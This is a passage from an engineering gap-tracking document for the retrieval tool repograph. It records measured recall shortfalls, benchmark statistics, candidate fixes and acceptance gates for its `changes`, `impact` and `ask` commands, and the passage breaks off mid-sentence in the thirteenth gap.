# What the 2026-09-03 numbers say is weak

Every item below is a gap the [three-graph run](2026-09-03-three-graphs-results.md)
measured on repograph 0.4.0, not a wish. Each carries the number that exposed it, the
diagnostic that would confirm the cause, the lever, and the gate that would tell us
it worked. They are ordered by how much of a real answer is missing, not by effort.

Two of them are the language work already scheduled for 0.6.0; what this file adds is
that the bench says they are not a nice-to-have.

Each heading now carries a status line from the 2026-09-04 run
([`2026-09-04-repograph-0.5.0-results.md`](2026-09-04-repograph-0.5.0-results.md)). Three
closed, one was measured and rejected, and two are closed on one half and deferred on the
other — a gap is not closed because a task ran against it.

G7 is the exception to both paragraphs above: it was raised after the 2026-09-04 run rather than
by it, by re-measuring the enriched store once `bench` began grading stores by state, so it
carries a raised line where the others carry a status one.

G9, G10 and G11 were raised on 2026-09-05 by the first run of the developer-questions suite and
carry a **Verdict** line from the six levers measured against them the same day
([results](2026-09-05-dev-cases-results.md)); G12, G13 and G14 were raised by those measurements.

G15, G16 and G17 were raised on 2026-09-06 by
[the residue, the seat and the register](2026-09-06-residue-seat-register-results.md), and none of
them is a retrieval gap. Two
are what the instruments did not report — a case that lost two of its three anchors and kept its
verdict, and an `enrich` run that wrote nothing and exited 0 — and the third is how the population
a constant is derived on was chosen.

G18 was raised on 2026-09-07 by the Windows port's CI work rather than by any run. It is the one
item here no number exposed and no number could: a `changes` defect the pinned fixture cannot
trigger, because not one of that corpus's paths carries a byte outside ASCII.

G19 onward are a second family, and the subject changes with them. They were raised by the two
resource runs of 2026-09-07 — [what every command costs](2026-09-07-resource-usage-results.md) and
[a rebuild measured against the person at the keyboard](2026-09-07-unnoticeable-results.md) — and
they measure what the tool costs to run rather than what it answers: wall, CPU, memory, and the
platforms none of that was measured on. No retrieval floor moved in either run and none of these
gaps is about one. Like G7 they carry a raised line rather than a status one, because the runs that
raised them are not the run the rest of this file is written against. They have an order of their
own at the end, for the same reason.

G28 onward are a third family, raised on 2026-09-09 by two pieces of work that share a branch
([PR #21](https://github.com/devmaxxx/repograph/pull/21)): the first reading of `ask --rerank` on
the 82 recorded cases, and the rewrite that took `id_families` out of the configuration and
derives every family from the definitions the documents carry. The numbers live in
`bench/history/runs.jsonl` (the rows of that day, tagged `derived-read` and `derived`) and in the
README sections the branch rewrote, not in a results document of their own. Four are about the
reranker, four about the derivation, one is a defect in what a repository's configuration is
allowed to do to the machine that reads it, and none moves a floor: the read path under derivation
reproduces every recorded count, and the reranker is measured and not floored. They have an order
of their own at the end, after the cost family.

---

## G1 · A third of a large blast radius is invisible — `changes` 27/38 symbols

**Status (2026-09-04):** the file half is **closed by Task 2, against a narrow
denominator** — `changes` names 498/498 files over 8 diffs, and the case that read 11/18
files reads 25/25, because a hunk in a file the graph never indexed is now printed as that
file rather than dropped. The denominator is `code_files`, the files the truth harness
attributed a declaration to, not the files the diff touched: on `bc9db289~1` 119 files carry
hunks and 18 are counted, the excluded 101 including fifteen TypeScript files and nine of
sixteen Kotlin ones — the very files this gap is about. 498/498 is therefore evidence the
tool stopped dropping the files it is asked about, not a measurement that it names every
changed file.

The symbol half is **baseline written; the extractor is 0.6.0's** — 57 of the 61 symbols
still unnamed are Kotlin declarations, and the remaining 4 are one truth-side
mis-attribution, not a repograph miss. Numbers and the bucketing:
[`2026-09-04-repograph-0.5.0-results.md`](2026-09-04-repograph-0.5.0-results.md). The
gate's "≥34/38 symbols on the 18-file case" cannot be checked as written: that case's
want-total grew with the corpus, so the run reads 48/54 at a different HEAD.

**Measured.** `changes` scored 32/43 symbols and 13/20 files overall, and the split is
the whole story: **5/5 symbols on a 2-file diff, 27/38 on an 18-file one.** Seven of
the twenty files were never named at all.

**Cause, and it is not ranking.** `code_globs = ["**/*.ts", "**/*.tsx"]`
(`src/config.rs:31`). `changes::touched` intersects hunk line ranges with `Symbol`
nodes; a file with no symbols falls back to its file node, and a file with no node at
all is invisible. `beauty-crm`'s large diffs carry `.kt`, `.sql`, `.json`, `.yaml`
and `.gradle.kts`, and its 18-file case is exactly that mix. A tool whose answer to
"what does this change touch" silently omits a third of the change is worse than one
that says it does not know.

**Diagnostic before the lever.** Re-run the `0f27d2d1` case with the per-file list
printed, and bucket the eleven missing symbols by extension. If they are all
non-TypeScript, this is G1 and nothing else; if some are `.ts`, a second cause is
hiding behind the first and it belongs in G3.

**Lever.** The 0.6.0 language work — Kotlin, C#, Python — plus a decision this run
makes urgent: **a file the extractor cannot parse still deserves a file node**, so
`touched` reports it rather than dropping it. That is cheap, it is language-independent,
and it converts a silent omission into an honest "this file changed, I cannot tell you
which symbol".

**Gate.** The 18-file case reaches ≥34/38 symbols and 18/20 files with the unparsed
files reported as files. Add a third `changes` case whose diff is deliberately
polyglot, so the suite keeps measuring this after the fix.

---

## G2 · Fourteen paraphrases, twelve of them a neighbour away — strict 16/30, soft 28/30

**Status (2026-09-04):** **measured and rejected, not closed** — Task 6 ran the local
cross-encoder this gap named as the one unmeasured lever.
[ADR-001 Amendment 4](../adr/ADR-001-paraphrase-recall-was-a-prediction.md) is the
authority: `--rerank-local` at depth 200 reads paraphrase 17/30 against a control of
15/30, but keyword 39/40 and 17.9 s a question against a bar of one second. Two of the
five conditions fail, so no floor moved and the flag ships opt-in. The gap stays open;
what closes is only the question of whether that lever was worth trying.

**Measured.** Strict 16/30, soft 28/30. Twelve of the fourteen misses opened the right
file and named a neighbouring requirement; only two (`FR-AI-102`
«сколько времени держим записи кто решает», `FR-CAL-101`
«как отдаём освободившееся окно тому, кто ждёт») failed to surface the file at all.

**What is already exhausted.** [ADR-001](../adr/ADR-001-paraphrase-recall-was-a-prediction.md)
and its three amendments measured and rejected: more seeds (one hit per 1.5× tokens),
a wider one-hop cap (one hit, p90 218→510), `MultilingualE5Base` (6/14, a *different*
six), 512-token passages (5/14 at 2× embedding time), label-only second vectors
(6/14), `BGEM3` (5/14 at 1 454 s), quantized paraphrase MiniLM (2/14, keyword down to
21/24), doc2query rows pooled with passages (4/14), and query rewriting (paraphrase
6/14, keyword down to 20/24). None is adopted. Six of the eight misses on the old set
were shared by every E5 variant, which points at the model's distance between question
and target, not at the index.

**What works and what it costs.** `ask --rerank` with candidate snippets, a pool of
200 and no pinned seeds reads 14/14 paraphrase, 24/24 keyword, 3/3 code on three
consecutive sonnet runs — at ≈19k input tokens and ~4.3 s per question. It is opt-in
and deliberately not on a floor.

**The one lever never measured.** A local cross-encoder — `bge-reranker-v2-m3`, a
2.3 GB download — is named in ADR-001 as unmeasured. It is the only candidate that
could give reranker-shaped gains at zero API cost and without a per-question latency
in seconds. **Measure it before designing anything else for paraphrases.** If it lands
between 10/30 and 14/30 at sub-second latency, the paraphrase floors move for the
first time since 0.4.0; if it does not, the honest answer is that this corpus's
paraphrases need a model and the floors stay where the measurement put them.

**The two soft misses are a different bug.** They are coverage, not ranking: the
target file never entered the pool. Diagnose them with
`repograph dump --queries` and read the four retriever lists 300 deep. If the target
is absent from all four, no reranker will ever help, and the question is what the
extractor did with that requirement.

**Gate.** The 400 held-out question set with a paired exact McNemar test against the
shipped rule — the existing bar — before the 82 real cases are consulted as the smoke
test they are. Do not move a floor on 30 noisy cases alone: Wilson 95% on 16/30 is
0.35–0.69.

---

## G3 · Three hub targets short — `impact` 110/114

**Status (2026-09-04):** **closed by Tasks 3 and 4** — 123/123 files over 16 targets,
mean recall 1.0, every target at 1.0. The gate asked for 114/114 or a named exclusion;
what the diagnostic found is that the answer is both, in different files. Three of the
114 were a symbol name inside a string literal — never a reference, so Task 3 removed
them from the truth rather than excluding them in prose, which takes the original ten
targets to 111/111. The fourth was real: `AuthService`'s tenth file imported it through
a barrel, and Task 4 made a re-exporting barrel an importer. The 0.949 this gap was raised
on is in [the three-graph results](2026-09-03-three-graphs-results.md); what closed it is in
[the 0.5.0 gap-closing results](2026-09-04-repograph-0.5.0-results.md).

---

## G4 · The blast suite has 20 cases and no confidence story

**Status (2026-09-04):** **closed by Task 5** — `blast.jsonl` is 32 cases: `impact` 10
→ 16 (six narrow targets, the tier a mean over hubs hides), `changes` 2 → 8 diffs
spanning small/large and mono/polyglot, `trace` unchanged at 8. The decision rule this
gap asked for is written down in
[`three-graphs.md`](three-graphs.md#when-a-blast-delta-counts), per suite, with a noise
column — stated before the changes above were measured against it. Numbers:
[the 0.5.0 gap-closing results](2026-09-04-repograph-0.5.0-results.md).

---

## G5 · Strict is a substring, so ranking is unmeasured

**Status (2026-09-04):** **closed by Task 1** — every retrieval row carries `rank`, the
summary carries `mrr`, and this run measures **0.635** overall: keyword 0.816, code
1.000, paraphrase **0.247** with 2 of 30 at rank 1. One clause of the gate is unmet and
unmeetable: the 2026-09-03 rows cannot be rescored, because the harness stored counts
and never the answer text, so the field starts here with no prior value. The paraphrase
row also answers the question this gap was raised to serve — reordering cannot produce
the 14 ids that are absent, and finding them would not by itself put them first. Numbers:
[the 0.5.0 gap-closing results](2026-09-04-repograph-0.5.0-results.md).

---

## G6 · One corpus, one language, one id census

**Status (2026-09-04):** **baseline written; the extractor is 0.6.0's, and so are two
thirds of this gate.** `bench/corpora/beauty-crm-mobile/blast.jsonl` holds eight Kotlin
`impact` targets and
[`../../bench/results/2026-09-04-beauty-crm-mobile.json`](../../bench/results/2026-09-04-beauty-crm-mobile.json)
records what they read today: recall 0.0, 0/20 files, every case wanting at least one
file. Zero is the intended number — there is no Kotlin extractor yet — and writing it
down before the work is the whole point. The gate is **not** met: it asks for one
`impact`, one `trace` **and** one `changes` case per corpus, and only the `impact` third
was built; the retrieval half was not attempted either, because it needs that corpus's
own `id_families` census. Second corpus, second language, still one id census.

**Measured, structurally.** All 102 cases are `beauty-crm`. All 30 paraphrases are
Russian. `repograph.toml` says of its own `id_families` list: "This is beauty-crm's
census, not a generic default; a different repository should list its own families."
Nothing in the suite measures the tool on a repository it was not tuned against.

**Why it matters for the next version.** 0.6.0 targets C#, Kotlin and Python for
`bonliva-crm-nx`, `beauty-crm/mobile` and `bonliva-erp`. Shipping language support
with no cases from those corpora repeats exactly the mistake ADR-001 exists to record:
a number that was a prediction travelling as though it had been measured.

**Lever.** A second case file per new corpus — smaller is fine, 20–30 cases — built
the same way: expectations recomputed from the repository at run time, so the set goes
stale only when a name disappears. The retrieval half will need each corpus's own id
families; the blast half needs nothing but symbols and should port directly.

**Gate.** No language ships in 0.6.0 without at least one `impact`, one `trace` and
one `changes` case in its own corpus, and a result file beside this one.

---

## G7 · Enrichment cost two exact keyword seeds — closed 2026-09-05

**Raised (2026-09-04):** not by the three-graph run. It surfaced once `bench` began grading a
store on the configuration it actually is
([ADR-001 Amendment 5](../adr/ADR-001-paraphrase-recall-was-a-prediction.md)): the enriched
lexical-only arm read `keyword 37/40` against the raw store's `39/40` on the same corpus, missing
`FR-WH-53` and `W-206` that the raw store answered, and `repograph bench --no-dense` exited 1.

**Closed by** the per-question gate on the generated-questions list described in
[ADR-001 Amendment 6](../adr/ADR-001-paraphrase-recall-was-a-prediction.md): the list joins the
plain-path fusion only when its best BM25 score is at least 0.85 of the passage list's. The
enriched lexical-only arm reads `keyword 39/40  paraphrase 14/30  code 12/12  p90 215` — parity
with the raw store, both runs identical case by case — the arm with embeddings is unchanged at
40/40 and 15/30 with p90 down from 226 to 220, the raw arms are untouched by construction, and 400
held-out questions moved by 5 gained and 7 lost, exact McNemar p = 0.77. The floor in that arm moved
from 40 to 39, which is what both stores measure at this commit; it did not move while the arm read
37, because 37 was a cost enrichment imposed.

**What the measurement corrected.** The cause first named here — the questions list pushed ahead of
the passage list — was wrong: leading with the passage list moves the three misses from fused rank
6, 10 and 42 to 6, 9 and 41. The cost was the list's *share* of five seeds in a round-robin, on
questions it held no answer to (ten of the forty keyword cases, against zero for the passage list).
Thinning that share for every question was the first lever tried and was rejected by this gap's own
gate — lexical held-out recall@5 0.283 → 0.255, 13 lost and 2 gained, p = 0.007 — because on a
paraphrase the questions list is the retriever doing the work. And the held-out set had to be
rebuilt before any of that could be read: written as kind `paraphrase` instead of `synthetic`,
`dump` had not held anything out, and the set read 0.955. `bench/heldout.py` now builds it with the
right kind and a recorded seed, and `dump`'s recorded answer comes from the held-out indices too.

**What stays open.** `FR-PH-43` — «критерий готовности рыночному запуску» — sits at passage rank
23 and no lexical path reaches it in either store; only the dense list does. That is a lexical
retrieval limit, not an enrichment cost, and it is why both lexical-only floors are 39 rather than
40. And the gate's window is narrow, and narrower than first published. The closing note said
held-out tolerates any threshold up to 0.90; the review measured 0.87 and 0.90 reddening the arm
with embeddings — paraphrase 13/30 under its floor of 14 — while held-out never binds at any value
from 0.80 to 0.95 (p = 0.34 to 0.79). The window on the 82 is (0.802, 0.866]: below it `FR-WH-53`
(ratio 0.801) loses its seat, at 0.87 a paraphrase (ratio 0.867) loses its list. The centre, 0.83,
reads the same on the 82 and loses three more lexical held-out questions than 0.85 (109 → 106,
none gained), so 0.85 stays, with 0.006 of room above. Why the ratio is a constant of this store
and what would carry across stores is gap G8. Any move of it is judged on the held-out set first —
the order of operations in `bench/heldout.py`'s header, which now covers both arms.

---

## G8 · The questions gate is a constant of one store

**Raised (2026-09-05)** by the review of G7's fix. The gate compares the best BM25 score of the
generated-questions list with the best of the passage list, and the two are only half
comparable — why is measured in
[ADR-001, Amendment 7](../adr/ADR-001-paraphrase-recall-was-a-prediction.md): each index
normalises length and weights terms against its own population, so the ratio moves with
enrichment coverage and with questions per node, and 0.85 is where *this* store's two populations
part — window (0.802, 0.866] on the 82, 0.006 of room above. A store with short bodies, full
enrichment or five questions per node lands somewhere else, and nothing in the code would say so.

**Gate.** A scale-free form — each list's best against its own *k*-th score, or a z-score within
its own list — replaces the constant only if it reproduces the four arms exactly on this store
(`40/40 15/30 12/12`, `39/40 14/30 12/12`, raw `40/40 9/30`, `39/40 7/30`, p90 ≤ 230), is not
significantly worse on the held-out set in either arm, and reads at least as well on the 60
`dev-cases`. The order of operations is `bench/heldout.py`'s header. Not tried.

**Status (2026-09-05, 0.5.0): measured, not closed.** All three scale-free forms the design note
pre-registered were derived and scored offline over the fixture's dumps, in order, and all three
failed the first clause — the exact reproduction of the four arms. `coverage` at c = 0.761 reads
`40/40 15/30 12/12` with embeddings and `39/40 **15**/30 12/12` without, `peak` at c = 0.894 reads
`40/40 14/30 12/12` and `38/40 14/30 12/12`, `z` at c = 0.548 reads `40/40 15/30 12/12` and
`37/40 15/30 12/12`. The gate stays at 0.85 and `src/query.rs` is untouched, so there is no ADR-001
amendment. Coverage fails only by being *better* — one paraphrase more in the lexical arm, both
developer arms up, held-out up in both arms and significant in neither — and a plan that
pre-registers "every floor held, developer suite not down, held-out not worse" can ship it on the
recorded evidence without re-measuring. What that evidence still lacks is the fourth clause: the
second population (the fixture's questions cut to five per node) was never built, so nothing yet
shows the constant is a property of the query rather than of this store. Every number is in
[the 0.5.0 gap results](2026-09-05-0.5.0-gaps-results.md), L1.

**Status (2026-09-06, 0.5.0): closed for scale, named for vocabulary.** The `coverage` form ships
at c = 0.761 under a rule written and committed before it was implemented, replacing the clause
that had required the four arms to reproduce exactly. The constant no longer moves with the two
indices' mean lengths or vocabulary sizes, which is what this gap asked. It is not free of the
store in every sense: `attainable` counts only the query terms an index actually holds, so a store
whose questions use a much narrower vocabulary than its passages seats its questions list more
readily, and nothing in the code says so. Measured, named and left standing —
[the coverage admission results](2026-09-06-coverage-admission-results.md).

**Status (2026-09-06, 0.5.0): closed.** The residue this gap was left with is charged.
`attainable` now sums idf over **every** unique query term, one the index never saw at the idf
BM25 gives df = 0 (`ln(2n + 2)`), so a term an index lacks lowers that list's coverage instead of
leaving its denominator, and no index is rewarded for a narrow vocabulary. `search` is untouched
— every ranked list in all six dumps is byte for byte the shipped binary's, checked before any
admission number was read. The constant was re-derived under the new form on the same 400 held-out
questions in the same arm, before either suite was opened, and returned 0.761 again: the literal
does not move, but it is now a constant of the form that ships. All seven pre-registered clauses
hold — the four recorded arms' counts identical, developer totals 38 and 38 with `where` 0/9, both
held-out compares 2 gained and 1 lost at p = 1.0000, the replay reproducing the binary on 82, 60
and 400 in both arms. Seventeen cases changed the answer they return without any case changing its
verdict, which is the shape the rule allowed for —
[the residue, the seat and the register](2026-09-06-residue-seat-register-results.md), rule R.

---

## G9 · Code is unreachable from prose — `where` 0/9

**Raised (2026-09-05)** by the first run of the developer-questions suite
([results](2026-09-05-dev-cases-results.md)). Nine questions describe a behaviour and ask which
file to edit; none reaches its file in either arm, and 12 of the 13 file anchors are absent from
every lexical list 300 deep. The store said nothing about what code does: a symbol's text was its
name and signature line, a file node had no text and was not indexed, and `enrich` asked about
documents only. The `cross` kind reads the same hole from the requirement's side — 12/15 reach the
requirement, 11 of 15 file anchors are absent.

**Levers, measured in that document.** A1: doc comments and file heads become node bodies,
files with a head are indexed, identifiers are indexed by their words — no tokens. A2: `enrich
--code` generates questions about code through a prompt of its own — tokens, opt-in, and the
`enriched` grading of documents unchanged. Each ships only on the rule written there: every
recorded floor held in all four arms, held-out not significantly worse in either, dev-suite hits
up in both arms with `where` above zero.

**Verdict (2026-09-05):** **partly closed, and not in the plain `ask`.** Four levers were measured
against that rule and all four were rejected. A1: the bodies in the passage index moved the BM25
statistics and cost paraphrase, 15/30 → 13/30. A2: the code questions inside the documents'
questions index lifted that index's average length, every questions score rose by about a quarter
(`N-071` 9.01 → 11.57), and the gate admitted the questions list over the passage holding the
answer — keyword 39/40 → 38/40 without embeddings, `where` 1/9. A3: the same questions as a list of
their own, admitted last on the 0.85 gate, cost `FR-WH-53` and `FR-CRM-11` and lost six and seven
held-out questions with none gained. A4: that list capped at one seat holds every floor and reads
`where` 2/9, and still loses six held-out questions in each arm with none gained, p = 0.031. What
ships is the machinery — doc comments and file heads extracted for the prompt and for display,
`enrich --code` writing questions about 3,463 of 3,475 code nodes, and those questions in an index
of their own that reaches the `ask --rerank` pool and never the plain fusion. `where` therefore
stays 0/9 in the shipped configuration, and what would move it without taking a document seat is an
admission rule that is not a ratio of two indices' raw scores — G12, with G13's table as what it is
judged on.

## G10 · Five seeds over three lists — the right answers that were ranked and not seated

**Raised (2026-09-05)** by the same run. 31 missed anchors sit at rank ≤ 20 of some retriever
list and are not among the five seeds, most of them `multi` siblings (`FR-STAFF-20/21/22`,
`FR-PAY-22/25/26/27`, `FR-CAL-110/111/112`): a round-robin over three lists gives each list at
most two seeds, so a list's third right answer never surfaces. Seven of the recorded suite's
fifteen paraphrase misses have the same shape (rank 3–9 of their best list). More seeds was
measured and rejected in ADR-001 (~1.5× tokens a step for about one hit); a fourth list (dense
questions) was simulated over the dumps and rejected (paraphrase unchanged at every gate,
keyword −1, held-out 102 → 92–96). What remains untried is seating by *agreement between
lists* rather than by turn — an id two lists rank in their top ten ahead of an id one list ranks
second — which ADR-001's first amendment rejected as RRF for a different reason (it buried a
dense rank-2 target) and which a sibling-aware expansion could serve instead: when a seed's
document neighbours are themselves ranked, name them on the expanded line. Gate: `multi` and
`rule` up on the dev suite, the recorded suite unchanged, held-out not worse.

**Verdict (2026-09-05):** **confirmed as the binding constraint, and priced.** A4 is the
measurement this gap was missing: a fourth list, admitted only when it clears the gate and capped
at a single seat, reads `where` 0/9 → 2/9 on the developer suite and loses six of 400 held-out
questions in each arm with none gained (p = 0.031); uncapped (A3) it loses six and seven and takes
`FR-WH-53` and `FR-CRM-11` off the recorded suite as well. Five seeds are the budget the recorded
floors were set on, and any list that earns its turn displaces a document seed. Closed as measured,
not as fixed: seating by agreement between lists, the one shape still untried, is what this gap
asks for.

## G11 · The embedder, for Russian paraphrase

**Raised (2026-09-05)**, sharpened from ADR-001's first amendment. Eight of the recorded
suite's fifteen paraphrase misses sit at rank 31+ in every list while the store's own generated
questions for the target are near-synonyms of the query — «Где лежит короткий код на
устройстве?» against «как хранится код доступа сотрудника» at dense-questions rank 209. That is
`multilingual-e5-small`'s distance between two Russian paraphrases, and no fusion rule repairs it.
The first amendment measured `e5-base` and `bge-m3` on fourteen cases without generated questions
and found no gain; neither was measured with the question rows in the index, which is where a
stronger model would show. Lever: `REPOGRAPH_EMBED_MODEL` re-embeds a store copy under another
hub model; `multilingual-e5-large` is the one measured in the results document. Gate: the same
three-way rule, dense arms only, plus query latency under a second.

**Verdict (2026-09-05):** **closed for the dense arm, as an option.**
`intfloat/multilingual-e5-large` on a copy of the fixture store reads paraphrase **22/30** against
the small model's 15/30 — seven of the fifteen misses — with keyword 40/40, code 12/12, p90 224,
the developer suite 37/60 and held-out 103 → 119 of 400 (+19 −3, p = 0.0009): the whole three-way
rule, in the arm it applies to, and query latency still under a second. It ships as a property of
the store — `embed_model` in `repograph.toml`, recorded in `vectors.json`, opened by every reader —
and the default moved to it at `35357c1`; `UNNAMED_MODEL` keeps a store with no recorded model
reading as the small one, so an older store never silently reinterprets under the new default. The
cost of that default is measured in [Embeddings](../../README.md#embeddings). Nothing here reaches
the `--no-dense` arm, which has no dense list to improve.

**Update (2026-09-06, 0.5.0):** `bench` has floors of its own for the large model since 0.5.0 —
40/22 enriched and 40/17 raw ([the 0.5.0 gap results](2026-09-05-0.5.0-gaps-results.md)).

**Update (2026-09-09): the band half of this argument is gone.** The removal
([the plan](../plans/2026-09-09-normal-band-only.md)) takes the 4.1–4.5× multiplier and G20's
complaint with it. What the default now rests on is two foreground numbers and a download: 1,930 s
against 266 s, and 2.1 GB against 470 MB
([the 2026-09-09 results](2026-09-09-normal-band-only-results.md),
[ADR-002 Amendment 1](../adr/ADR-002-two-defaults-multiplied.md)). The conclusion is unchanged.

**Update (2026-09-07): the option stands, the default does not.** Nothing measured here moved —
e5-large still reads 22/30 against 15/30 and keeps its own floors — but the price of it *as a
default* did, because `priority = "background"` became the writers' default in the same version.
the whole-store embed the large model needs is 1,930 s foreground against the small model's 214 s
([what every command costs](2026-09-07-resource-usage-results.md) §1.1), and the band multiplies
both by 4.1–4.5× — a ratio, not a wall, which is G20's whole complaint. Hours against minutes
either way you take the ratio, so the default went back to
`intfloat/multilingual-e5-small` and e5-large stayed the one line that buys the recall:
[ADR-002](../adr/ADR-002-two-defaults-multiplied.md).

## G12 · The gate compares raw BM25 scores across two indices

**Raised (2026-09-05)** by A2. The questions gate — and the code gate A3 gave the code list — divides
one index's best score by another index's best score. Each index normalises length against its own
mean and weights terms by its own vocabulary, so a population change in one of them moves the ratio
while nothing about the query, the answer or the fusion changes. A2 is the proof: 3,463 code nodes
gaining questions turned one-token documents in the questions index into question-length ones, every
questions score rose by about a quarter (`N-071` 9.01 → 11.57) while the passage scores stayed,
`FR-WH-53`'s ratio moved 0.80 → 1.03, and the questions list was admitted over the passage that held
the answer — keyword 39/40 → 38/40 in the `--no-dense` arm, on a change that added no document to
that arm's passage index. G8 says the constant's *value* is a property of one store; this says the
comparison itself is between two units.

**Lever.** A normalised admission: each list's best as a fraction of what the query could attain in
that index, or each list's best against its own *k*-th score, so the constant is a property of the
query rather than of the store's populations. That is the same shape G8 asks for, and closing it
would close G8 with it.

**Gate.** The four arms reproduced exactly on this store (`40/40 15/30 12/12`, `39/40 14/30 12/12`,
raw `40/40 9/30`, `39/40 7/30`, p90 ≤ 230), held-out not significantly worse in either arm, and the
developer suite not down — then a second store, enriched to a different depth, reading the same
admissions the ratio would have given it. Unmeasured.

**Status (2026-09-05, 0.5.0): measured, not closed.** Three normalised admissions were built and
scored — a list's best over what the query could attain in that index (`coverage`), over its own
fifth score (`peak`), and as a z-score within its own list (`z`) — each with its constant derived
from the 400 held-out questions in the `--no-dense` arm before either suite was opened, and each
failing the exact-reproduction clause. The replay that produced them is not throwaway: `bench/admission.py`
replays the plain fusion offline over `dump` records and reproduces the shipped binary case for case
(82/82, 60/60, 400/400 in both arms) under the ratio, and `dump` now carries an `attainable_*` column
per list, so the next attempt costs a replay rather than a build. The comparison is still between two
units in the shipped binary. See [the 0.5.0 gap results](2026-09-05-0.5.0-gaps-results.md), L1.

**Status (2026-09-06, 0.5.0): closed.** The admission compares two coverages, each computed inside
one index, rather than two raw BM25 scores from indices that were never in the same unit. The
lexical arm reads paraphrase 15/30 against the ratio's 14/30, both developer totals rise, held-out
gains one question with embeddings and three without at p = 1.0000 and p = 0.4531, and
`bench/admission.py` reproduces the binary on all 1,084 queries —
[the coverage admission results](2026-09-06-coverage-admission-results.md).

## G13 · Ten `where` anchors sit at code-list rank 1–9 and six are below the gate

**Raised (2026-09-05)** by A3's dumps (`dump --queries`, `--no-dense` arm, 300 deep). The ratio is
the code list's best BM25 score over the passage list's best for the same query; A3 admits the code
list at 0.85, so a file anchor at code-list rank 1 with a ratio of 0.45 is never seated.

| kind | file anchor | code-list rank | ratio | best code | best passage |
|---|---|---|---|---|---|
| cross | apps/api/src/modules/availability/booking-create.service.ts | 1 | 0.86 | 30.06 | 34.86 |
| where | packages/domain/src/schedule/subjectAvailability.ts | 1 | 1.44 | 25.59 | 17.75 |
| where | packages/domain/src/money/index.ts | 1 | 0.64 | 23.61 | 36.92 |
| where | packages/db/src/schema/salon/catalog.ts | 1 | 0.99 | 28.28 | 28.69 |
| where | apps/api/src/shared/audit/pii-read.ts | 1 | 0.45 | 21.21 | 46.79 |
| cross | packages/ports/src/llm.ts | 1 | 0.65 | 24.30 | 37.38 |
| cross | packages/db/src/auditChain.ts | 1 | 0.56 | 19.53 | 34.80 |
| where | packages/contracts/src/money.ts | 2 | 0.64 | 23.61 | 36.92 |
| cross | packages/ports/src/fiscal.ts | 3 | 0.60 | 22.86 | 38.04 |
| where | apps/api/src/shared/audit/contact-access.repository.ts | 3 | 0.45 | 21.21 | 46.79 |
| where | apps/api/src/modules/identity/identity.repository.ts | 5 | 0.84 | 22.26 | 26.58 |
| where | apps/api/src/shared/db/database.service.ts | 6 | 0.90 | 22.69 | 25.28 |
| cross | packages/domain/src/availability/segments.ts | 8 | 0.61 | 17.80 | 29.09 |
| cross | apps/api/src/modules/sync/change-log-compaction.service.ts | 8 | 0.51 | 17.99 | 35.56 |
| where | apps/api/src/shared/context/tenant-context.interceptor.ts | 8 | 0.90 | 22.69 | 25.28 |
| where | apps/api/src/modules/identity/auth.service.ts | 9 | 0.84 | 22.26 | 26.58 |
| cross | apps/api/src/modules/identity/totp.ts | 15 | 0.69 | 22.60 | 32.90 |
| cross | packages/domain/src/availability/core.ts | 17 | 0.74 | 26.68 | 36.05 |
| cross | packages/contracts/src/generated/permissions.ts | 19 | 0.42 | 17.22 | 40.71 |

Ten `where` file anchors sit at code-list rank 1–9: four clear the gate (1.44, 0.99, 0.90, 0.90) and
six sit below it at 0.45–0.84. The retrieval is not the problem — the code questions put those files
at the top of their own list — the admission is. A lower gate for the code list is not the lever: it
is a second constant chosen by looking at the developer suite, which is how a suite stops measuring
anything. The honest form is G12's, and this table is what it would be judged on.

**Gate.** `where` above 0/9 in both arms with every recorded floor held and held-out not
significantly worse in either — the same three-way rule A2 to A4 were read against, which each of
them failed. Not tried in this shape.

**Status (2026-09-05, 0.5.0): regenerated, still open.** Stage B of the 0.5.0 admission work — the
code list admitted to the plain fusion under a scale-free form at one seat — needs a shipped form
and its constant, and no form shipped, so it was not run. `where` stays 0/9 and A4's price for one
seat (six held-out questions lost in each arm, none gained, p = 0.031) is still the number to beat.
The table is not the one above with columns added: it is a fresh 27-row table, code-list rank
1–286, from a new dump against a different store (`$G/bc-a1`, this plan's own copy, not the store
the table above was read against), with a column per candidate form so the next attempt reads what
each admission would have done to these anchors: six of its 27 rows clear the shipped ratio's 0.85,
14 clear `coverage`'s 0.761, 14 clear `peak`'s 0.894 and 26 clear `z`'s 0.548. It is in
[the 0.5.0 gap results](2026-09-05-0.5.0-gaps-results.md), L1.

**Status (2026-09-06, 0.5.0): still open, and the cause is sharper than this gap states.**
Regenerated under the shipped `coverage` admission, the table shows the code list ranking ten of
the thirteen `where` anchors in its own top ten, four of them at rank 1; the other three sit at 28,
38 and 286. The list is not failing to find these files. It has no seat on the plain path to say
so, so no admission form could ever have moved `where` off 0/9 — only stage B, one seat for the
code list, which A4 priced at six held-out questions lost per arm and which was not run
([the coverage admission results](2026-09-06-coverage-admission-results.md)).

**Status (2026-09-06, 0.5.0): stage B measured and rejected; still open, and now priced.** One
seat for the code list — its top-ranked document and nothing more, admitted against the passage
list at a constant of its own — was replayed on the code-enriched copy under a rule committed
first. The constant, `c_code = 0.902`, is the crossover of 800 held-out questions (the fixture's
400 document questions verbatim and 400 of the copy's 3,463 code entries) taken before either
suite was opened; above it the code list holds the answer in its top five four times as often as
the passage list, below it the passage list twelve times as often. The seat does what this gap
says it would: **`where` 0/9 → 2/9 in both arms**, developer totals 40 against 38, and the code
held-out set 54 → 122 and 40 → 115 at p = 0.0000. It also clears the clause A4 failed — the
document held-out price is five lost and none gained per arm at **p = 0.0625**, not significant,
where A4's six lost read p = 0.031. It fails on a clause A4 was never read against: the recorded
suite's lexical paraphrase falls 15/30 → 14/30, because the code seed takes the third slot on one
question and pushes off the fifth seed the anchor was reached by expansion from. `CODE_SEAT` was
never written into `src/query.rs`; the tooling that measured it shipped, so the next attempt starts
from a derived constant rather than a guess —
[the residue, the seat and the register](2026-09-06-residue-seat-register-results.md), rule S.

**Status (2026-09-06, 0.5.0): the blocker is the seed budget, not the admission form.** Stage B
seats one document — the code list's top-ranked, and only when its coverage against the passage
list's clears `c_code` — so ten `where` anchors inside the code list's own top ten buy at most one
seat, not ten.
Four of the thirteen `where` file anchors are at code-list rank 1 (`$M/t3-g13.md`, `$M` being that
campaign's scratch); two of those four clear 0.902 —
`packages/domain/src/schedule/subjectAvailability.ts` at 1.62 and
`packages/db/src/schema/salon/catalog.ts` at 0.93 — and those two are exactly the anchors the seat
found. `apps/api/src/shared/db/database.service.ts` and
`apps/api/src/shared/context/tenant-context.interceptor.ts` clear it at 0.95 and are never seated,
because they sit at code-list rank 6 and 8 and the one seat goes to rank 1. No constant reaches
them and no admission form could: what stands between the code list and the seven `where` cases
